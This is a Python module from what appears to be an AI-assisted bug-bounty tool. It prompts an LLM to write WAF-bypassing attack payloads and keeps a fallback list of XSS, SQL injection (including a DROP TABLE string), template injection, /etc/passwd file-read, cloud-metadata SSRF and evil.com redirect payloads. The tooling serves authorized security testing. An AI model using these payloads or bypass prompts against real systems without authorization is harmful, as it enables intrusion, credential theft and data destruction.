#!/usr/bin/env python3
"""
AI-BugBounty-Hunter — AI Payload Generator
Creates context-aware, intelligent payloads for vulnerability testing.
Adapts payloads to the specific technology stack and application logic.
"""
import asyncio
import json
import random
from typing import List, Dict, Any, Optional
from core.config import Config
from core.logger import Logger
from ai_engine.llm_client import LLMClient


class AIPayloadGenerator:
    """
    Generates smart, context-aware payloads using AI.
    Unlike static wordlists, these payloads are generated on-the-fly
    based on the target's technology stack, parameters, and application behavior.
    """

    PAYLOAD_PROMPT = """You are an expert penetration tester generating payloads for authorized security testing.

Target Context:
- Technology: {tech_stack}
- Parameter Name: {param_name}
- Parameter Type: {param_type} (e.g., string, numeric, JSON, file path)
- Application Behavior: {app_behavior}
- Vulnerability Type: {vuln_type}

Generate {count} unique payloads for {vuln_type} testing against this parameter.
Each payload MUST:
1. Be syntactically valid for the vulnerability type
2. Bypass common WAF/input validation (use encoding, case variation, etc.)
3. Demonstrate impact (e.g., callback URL, data extraction, timing difference)
4. Include a brief comment explaining the bypass technique used

Return as JSON array of objects:
[{{"payload": "...", "technique": "bypass method", "expected_behavior": "what to observe"}}]

Focus on modern, effective variants rather than basic/known patterns."""

    COMMON_PAYLOADS: Dict[str, List[str]] = {
        "xss": [
            "<script>alert(1)</script>",
            "\"><img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "<svg onload=alert(1)>",
            "'\"><script>alert(document.domain)</script>",
        ],
        "sqli": [
            "' OR '1'='1",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "' AND SLEEP(5)--",
            "1' ORDER BY 1--",
        ],
        "ssti": [
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "<%= 7*7 %>",
            "{{config}}",
        ],
        "lfi": [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "/etc/passwd%00",
            "php://filter/convert.base64-encode/resource=index.php",
        ],
        "ssrf": [
            "http://169.254.169.254/latest/meta-data/",
            "http://localhost:80/",
            "http://[::]:80/",
            "dict://localhost:11211/",
            "file:///etc/passwd",
        ],
        "open_redirect": [
            "//evil.com",
            "https://evil.com",
            "/\\evil.com",
            "https:evil.com",
            "%2F%2Fevil.com",
        ],
    }

    def __init__(self, config: Config):
        self.config = config
        self.logger = Logger("PayloadGen")
        self.llm = LLMClient(config)

    async def generate(
        self,
        vuln_type: str,
        param_name: str,
        param_type: str = "string",
        tech_stack: Optional[Dict] = None,
        app_behavior: str = "standard",
        count: int = 10,
    ) -> List[Dict]:
        """Generate AI-powered payloads for a specific vulnerability type and parameter."""
        if not self.config.get("ai_engine", "enable_payload_generation", default=True):
            return self._generate_fallback(vuln_type, count)

        tech_str = json.dumps(tech_stack or {}, indent=2)[:1500]
        prompt = self.PAYLOAD_PROMPT.format(
            tech_stack=tech_str,
            param_name=param_name,
            param_type=param_type,
            app_behavior=app_behavior,
            vuln_type=vuln_type.upper(),
            count=count,
        )

        try:
            response = await self.llm.query(prompt, temperature=0.7)
            json_str = self.llm.extract_json(response)
            if json_str:
                payloads = json.loads(json_str)
                if isinstance(payloads, list):
                    return payloads
            return self._generate_fallback(vuln_type, count)
        except Exception as e:
            self.logger.debug(f"AI payload generation failed: {e}")
            return self._generate_fallback(vuln_type, count)

    async def generate_waf_bypass(
        self, base_payload: str, waf_type: str = "cloudflare"
    ) -> str:
        """Generate a WAF bypass variant of a given payload."""
        prompt = (
            f"Given the payload: {base_payload}\n"
            f"And target WAF: {waf_type}\n"
            "Generate a single WAF-bypassing variant. Return ONLY the payload, no explanation.\n"
            "Use techniques like: mixed encoding, case mutation, comment insertion, parameter pollution."
        )
        try:
            response = await self.llm.query(prompt, temperature=0.6)
            return response.strip().strip("`").strip()
        except Exception:
            return base_payload

    def _generate_fallback(self, vuln_type: str, count: int) -> List[Dict]:
        """Generate fallback payloads if AI is unavailable."""
        base = self.COMMON_PAYLOADS.get(vuln_type, [f"test_{vuln_type}"])
        payloads = []
        for i in range(count):
            p = random.choice(base)
            if vuln_type == "xss":
                variants = [
                    p,
                    p.replace("'", "&#39;"),
                    p.replace("<", "%3C").replace(">", "%3E"),
                    f"<script>alert({i})</script>",
                    f"\"><img src=x onerror=alert({i})>",
                ]
            elif vuln_type == "sqli":
                variants = [
                    p,
                    f"' OR '1'='{i}",
                    f"' AND SLEEP({i % 5 + 1})--",
                    f"' UNION SELECT {','.join('NULL' for _ in range(i % 5 + 1))}--",
                ]
            else:
                variants = [p]

            payloads.append({
                "payload": random.choice(variants),
                "technique": "fallback_static_variant",
                "expected_behavior": f"Test for {vuln_type} vulnerability",
            })
        return payloads[:count]
